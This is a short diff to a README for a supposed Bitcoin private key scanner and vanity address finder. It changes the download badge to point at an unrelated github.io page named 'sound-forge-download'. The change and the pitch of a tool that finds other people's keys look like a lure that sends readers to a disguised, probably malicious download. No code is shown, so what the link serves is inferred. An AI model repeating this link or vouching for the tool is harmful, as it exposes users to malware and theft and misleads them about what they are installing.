@@ -2,7 +2,7 @@
 
 Blazing-fast Bitcoin private key scanner and vanity address finder. Built for security researchers and blockchain pros, with support for legacy, compressed, and SegWit addresses.
 
-[![Download BTC Key Finder](https://img.shields.io/badge/Download-Bitcoin_KeyFinder-blueviolet)](https://bitcoin-private-key-finder-ultimate.github.io/.github)
+[![Download BTC Key Finder](https://img.shields.io/badge/Download-Bitcoin_KeyFinder-blueviolet)](https://sound-forge-download.github.io/.github/)
 
 ---
 
